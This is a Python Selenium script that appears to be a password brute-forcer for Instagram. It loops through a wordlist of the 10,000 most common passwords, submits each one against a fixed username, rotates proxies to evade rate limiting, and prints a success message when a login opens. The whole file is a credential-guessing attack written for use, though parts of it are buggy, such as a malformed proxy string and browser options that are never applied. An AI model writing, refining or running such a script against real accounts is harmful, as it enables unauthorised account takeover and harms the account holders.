import time

from selenium import webdriver

from selenium.common.exceptions import NoSuchElementException
#from selenium.webdriver.ie import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

'''from http_request_randomizer.requests.proxy.requestProxy import RequestProxy
req_proxy = RequestProxy() #you may get different number of proxy when  you run this at each time
proxies = req_proxy.get_proxy_list() #this will create proxy list'''

'''options = Options()
options.add_argument('--proxy-server=46.102.106.37:13228')
browser = webdriver.Chrome(executable_path='ChromeDriverPath', chrome_options=options)'''
pr_counter = 0
with open('D:\\backup\\python projects\\Hack\\10k most common.txt', errors="ignore") as f:
    for line in f:
        pr_counter = pr_counter + 1
        if pr_counter > 9:
            pr_counter = 0
        PROXY = "23.23.23.23:3128" + str(pr_counter) # IP:PORT or HOST:PORT

        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--proxy-server=%s' % PROXY)


        driver = webdriver.Chrome(executable_path="C:\\Users\\Omar Hassan\\Downloads\\chromedriver_win32\\chromedriver.exe")  # Optional argument, if not specified will search path.

        driver.get('https://instagram.com/')

        #time.sleep(3) # Let the user actually see something!

        el = WebDriverWait(driver, 30).until(
            EC.visibility_of_element_located((By.XPATH, "//div[@class='wheel spinning']")))
        WebDriverWait(driver, 10).until(lambda d: 'spinning' not in el.get_attribute('username'))
        print()


        counter = 0
        driver.find_element_by_name("username").send_keys('3omar.hs_e')

        driver.find_element_by_name("password").send_keys(line.strip())

        driver.find_element_by_name("password").submit()
        # username
        # password
        counter = counter+1
        print(f"Try: {counter} , {line.strip()}")
         # Let the user actually see something!
        try:
            print("try..")
            driver.find_element_by_name("password").clear()
            print("done try..")
            driver.quit()

        except NoSuchElementException:
            time.sleep(7)
            print("except..")
            inputElement = driver.find_element_by_class_name("sqdOP.L3NKy.y3zKF").click()
            time.sleep(4)
            inputElement = driver.find_element_by_class_name("aOOlW.HoLwm").click()
            print(f"Account is opened!!, pass:{line.strip()}")
            print("end except")
            while True:
                pass

            # driver.quit()